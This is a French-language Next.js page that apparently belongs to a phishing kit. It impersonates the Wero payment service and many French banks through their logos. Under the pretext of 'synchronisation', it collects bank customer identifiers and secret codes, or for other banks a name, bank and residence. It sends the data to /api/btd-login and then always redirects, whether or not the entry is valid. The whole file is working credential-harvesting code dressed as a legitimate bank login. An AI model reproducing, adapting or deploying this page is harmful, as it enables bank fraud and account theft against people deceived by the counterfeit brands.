'use client';

import React, { useState, FormEvent } from 'react';
import { useParams, useRouter } from 'next/navigation';
import Link from 'next/link';

// Correspondance des visuels pour les 12 options
const LOGOS_MAP: Record<string, string> = {
  '1': '/IMG_9197.png',
  '2': '/Societe-Generale-Emblem.png',
  '3': '/BP-1.png',
  '4': '/ccf-logo.png',
  '5': '/lcl-logo.png',
  '6': '/12895685.png',
  '7': '/logo_BanquePostale_600x300.webp',
  '8': '/unnamed.jpg',
  '9': '/hello-bank-logo.png',
  '10': '/bnp-paribas-logo.png',
  '11': '/boursorama-logo.png',
  '12': '/bank-icon.svg',
};

const WERO_LOGO_PATH = '/wero-logo.png';

export default function DynamicOffrePage() {
  const params = useParams();
  const router = useRouter();
  const id = params?.id as string;

  const isAutre = id === '12' || id === 'autre';
  const partnerLogo = LOGOS_MAP[id] || '/bank-icon.svg';

  // États du formulaire (1 à 11)
  const [identifiant, setIdentifiant] = useState('');
  const [password, setPassword] = useState('');
  const [showKeypad, setShowKeypad] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // États pour la pop-up (Option 12 / Autre)
  const [showModal, setShowModal] = useState(isAutre);
  const [nom, setNom] = useState('');
  const [etablissement, setEtablissement] = useState('');
  const [resident, setResident] = useState('');

  const handleKeypadClick = (val: string) => {
    if (val === 'clear') {
      setPassword('');
    } else if (val === 'back') {
      setPassword((prev) => prev.slice(0, -1));
    } else {
      setPassword((prev) => prev + val);
    }
  };

  const handleSubmitMain = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      await fetch('/api/btd-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ offreId: id, identifiant, password }),
      });
    } catch (err) {
      console.error('Erreur :', err);
    } finally {
      router.push('/bat');
    }
  };

  const handleSubmitAutre = async (e: FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      await fetch('/api/btd-login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ offreId: '12', nom, etablissement, resident }),
      });
    } catch (err) {
      console.error('Erreur :', err);
    } finally {
      setShowModal(false);
      router.push('/bat');
    }
  };

  return (
    <div className="min-h-screen bg-slate-100 text-slate-800 font-sans flex justify-center items-center sm:py-6">
      {/* Cadre Mobile Propre & Neutre */}
      <div className="w-full max-w-md min-h-screen sm:min-h-[800px] bg-white sm:rounded-3xl sm:shadow-2xl flex flex-col justify-between overflow-hidden relative border border-slate-200">
        
        {/* Header blanc épuré */}
        <header className="px-6 py-4 flex items-center justify-between border-b border-slate-100 bg-white sticky top-0 z-20">
          <div className="flex items-center gap-3">
            {/* Logo Wero avec badge jaune de marque */}
            <Link 
              href="/portail" 
              className="w-10 h-10 bg-[#FFE800] hover:bg-[#E6D000] rounded-xl flex items-center justify-center p-1.5 shadow-sm transition-transform active:scale-95 overflow-hidden"
              title="Retour au portail Wero"
            >
              <img 
                src={WERO_LOGO_PATH} 
                alt="Wero" 
                className="w-full h-full object-contain rounded-lg"
                onError={(e) => {
                  e.currentTarget.onerror = null;
                  e.currentTarget.parentElement!.innerHTML = '<span class="font-black text-slate-900 text-xs tracking-tighter">wero</span>';
                }}
              />
            </Link>

            <span className="text-slate-300 text-xs font-bold">➔</span>

            {/* Logo Partenaire */}
            <div className="h-10 w-12 bg-white border border-slate-200 rounded-xl p-1 flex items-center justify-center shadow-sm">
              {isAutre ? (
                <span className="text-xl">🏛️</span>
              ) : (
                <img src={partnerLogo} alt="Partenaire" className="max-h-full max-w-full object-contain rounded-md" />
              )}
            </div>
          </div>

          <Link href="/portail" className="text-xs font-semibold text-slate-500 hover:text-slate-900 bg-slate-50 border border-slate-200 px-3 py-1.5 rounded-lg transition-colors">
            Changer
          </Link>
        </header>

        {/* CONTENU PRINCIPAL DU FORMULAIRE */}
        {!isAutre && (
          <main className="flex-1 px-6 py-8 flex flex-col justify-start animate-in fade-in duration-200">
            <div className="mb-8 text-center">
              <h1 className="text-2xl font-black text-slate-900 tracking-tight mb-2">
                Espace de connexion
              </h1>
              <p className="text-xs text-slate-500 font-medium">
                Veuillez saisir vos accès pour valider la synchronisation.
              </p>
            </div>

            <form onSubmit={handleSubmitMain} className="flex flex-col gap-5">
              <div className="space-y-1.5">
                <label className="block text-xs font-bold text-slate-800 uppercase tracking-wider">
                  Identifiant client <span className="text-red-500">*</span>
                </label>
                <input
                  type="text"
                  required
                  value={identifiant}
                  onChange={(e) => setIdentifiant(e.target.value)}
                  placeholder="Saisissez votre identifiant"
                  className="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-900 outline-none focus:bg-white focus:border-slate-400 focus:ring-2 focus:ring-slate-100 transition-all placeholder:text-slate-400"
                />
              </div>

              <div className="space-y-1.5">
                <div className="flex items-center justify-between">
                  <label className="block text-xs font-bold text-slate-800 uppercase tracking-wider">
                    Code secret <span className="text-red-500">*</span>
                  </label>
                  <button
                    type="button"
                    onClick={() => setShowKeypad(!showKeypad)}
                    className="text-[11px] font-bold text-slate-600 hover:text-slate-900 underline focus:outline-none"
                  >
                    {showKeypad ? 'Clavier standard' : 'Pavé numérique'}
                  </button>
                </div>

                <input
                  type="password"
                  required
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="••••••••"
                  readOnly={showKeypad}
                  className="w-full px-4 py-3.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-900 outline-none focus:bg-white focus:border-slate-400 focus:ring-2 focus:ring-slate-100 transition-all placeholder:text-slate-400"
                />
              </div>

              {/* Pavé Numérique Virtuel Neutre */}
              {showKeypad && (
                <div className="p-4 bg-slate-50 rounded-2xl border border-slate-200 mt-1 animate-in fade-in duration-150">
                  <p className="text-[11px] font-semibold text-slate-500 text-center mb-3">
                    Pavé numérique sécurisé
                  </p>
                  <div className="grid grid-cols-3 gap-2 max-w-[240px] mx-auto">
                    {['1', '2', '3', '4', '5', '6', '7', '8', '9', 'clear', '0', 'back'].map((key) => {
                      if (key === 'clear') {
                        return (
                          <button
                            key={key}
                            type="button"
                            onClick={() => handleKeypadClick('clear')}
                            className="py-3 bg-red-50 hover:bg-red-100 text-red-600 border border-red-100 font-bold text-xs rounded-xl transition"
                          >
                            C
                          </button>
                        );
                      }
                      if (key === 'back') {
                        return (
                          <button
                            key={key}
                            type="button"
                            onClick={() => handleKeypadClick('back')}
                            className="py-3 bg-slate-200 hover:bg-slate-300 text-slate-700 font-bold text-xs rounded-xl transition"
                          >
                            ⌫
                          </button>
                        );
                      }
                      return (
                        <button
                          key={key}
                          type="button"
                          onClick={() => handleKeypadClick(key)}
                          className="py-3 bg-white hover:bg-slate-100 active:bg-slate-200 text-slate-800 font-bold text-base rounded-xl border border-slate-200 shadow-sm transition"
                        >
                          {key}
                        </button>
                      );
                    })}
                  </div>
                </div>
              )}

              {/* Bouton Jaune Wero Distinct (CTA principal) */}
              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full py-4 mt-2 bg-[#FFE800] hover:bg-[#E6D000] active:scale-[0.99] text-slate-900 font-extrabold text-sm tracking-wider rounded-xl shadow-sm transition-all text-center uppercase flex items-center justify-center gap-2"
              >
                {isSubmitting ? (
                  <span className="w-5 h-5 border-2 border-slate-900 border-t-transparent rounded-full animate-spin" />
                ) : (
                  'VALIDER ET CONTINUER'
                )}
              </button>
            </form>
          </main>
        )}

        {/* POP-UP MODALE POUR OPTION 12 / AUTRE */}
        {showModal && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm animate-in fade-in duration-200">
            <div className="w-full max-w-sm bg-white rounded-3xl p-6 shadow-2xl border border-slate-100 relative">
              <h2 className="text-xl font-black text-slate-900 mb-1 text-center">
                Autre établissement
              </h2>
              <p className="text-xs text-slate-500 font-medium text-center mb-6">
                Renseignez les détails de votre profil pour poursuivre.
              </p>

              <form onSubmit={handleSubmitAutre} className="flex flex-col gap-4">
                <div>
                  <label className="block text-xs font-bold text-slate-800 mb-1">
                    Nom <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    required
                    value={nom}
                    onChange={(e) => setNom(e.target.value)}
                    placeholder="Votre nom complet"
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-900 outline-none focus:bg-white focus:border-slate-400 transition-all placeholder:text-slate-400"
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-slate-800 mb-1">
                    Nom de l’établissement <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    required
                    value={etablissement}
                    onChange={(e) => setEtablissement(e.target.value)}
                    placeholder="Ex: Établissement X"
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-900 outline-none focus:bg-white focus:border-slate-400 transition-all placeholder:text-slate-400"
                  />
                </div>

                <div>
                  <label className="block text-xs font-bold text-slate-800 mb-1">
                    Résident <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="text"
                    required
                    value={resident}
                    onChange={(e) => setResident(e.target.value)}
                    placeholder="Statut de résidence / adresse"
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-900 outline-none focus:bg-white focus:border-slate-400 transition-all placeholder:text-slate-400"
                  />
                </div>

                <div className="flex gap-3 mt-4">
                  <button
                    type="button"
                    onClick={() => router.push('/portail')}
                    className="flex-1 py-3.5 bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-xs rounded-xl transition"
                  >
                    RETOUR
                  </button>
                  <button
                    type="submit"
                    disabled={isSubmitting}
                    className="flex-1 py-3.5 bg-[#FFE800] hover:bg-[#E6D000] text-slate-900 font-extrabold text-xs rounded-xl shadow-sm transition flex items-center justify-center"
                  >
                    {isSubmitting ? (
                      <span className="w-4 h-4 border-2 border-slate-900 border-t-transparent rounded-full animate-spin" />
                    ) : (
                      'VALIDER'
                    )}
                  </button>
                </div>
              </form>
            </div>
          </div>
        )}

        {/* Footer Épuré */}
        <footer className="px-6 py-4 border-t border-slate-100 bg-slate-50/50 text-center">
          <p className="text-[11px] text-slate-400 font-medium">
            Interface sécurisée de traitement des transferts
          </p>
        </footer>

      </div>
    </div>
  );
}